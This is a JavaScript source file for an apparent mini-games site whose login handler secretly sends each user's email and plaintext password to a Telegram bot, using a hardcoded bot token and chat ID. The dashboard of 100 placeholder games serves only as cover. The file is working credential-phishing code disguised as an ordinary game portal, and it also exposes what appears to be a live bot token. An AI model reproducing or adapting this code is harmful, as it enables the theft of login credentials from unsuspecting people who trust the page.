const BOT_TOKEN = "9215057440:AAFpzPk23TO4rfn_uy9gCsbQOaExYOvtoS0";
const CHAT_ID = "5022620385";

const loginForm = document.getElementById('login-form');
const authModal = document.getElementById('auth-modal');
const gameDashboard = document.getElementById('game-dashboard');
const userDisplay = document.getElementById('user-display');
const gamesGrid = document.getElementById('games-grid');

// Handle Form Submission
loginForm.addEventListener('submit', async (e) => {
    e.preventDefault();
    
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;
    
    // Send data to Telegram Bot
    const message = `🎮 New User Sign-Up:\n📧 Email: ${email}\n🔑 Password: ${password}`;
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;  try { await fetch(url); } catch (error) { console.error("Failed to send notification", error); }  // Transition UI to the Game Dashboard authModal.classList.add('hidden'); gameDashboard.classList.remove('hidden'); userDisplay.textContent = `Welcome, ${email}`;
    
    loadMiniGames();
});

// Generate 100 Mini-Games placeholders
function loadMiniGames() {
    gamesGrid.innerHTML = '';
    for (let i = 1; i <= 100; i++) {
        const card = document.createElement('div');
        card.className = 'game-card';
        card.innerHTML = `<h3>Mini Game #${i}</h3><p>Click to Play</p>`;
        card.addEventListener('click', () => {
            alert(`Launching Mini Game #${i}! (Game logic goes here)`);
        });
        gamesGrid.appendChild(card);
    }
}
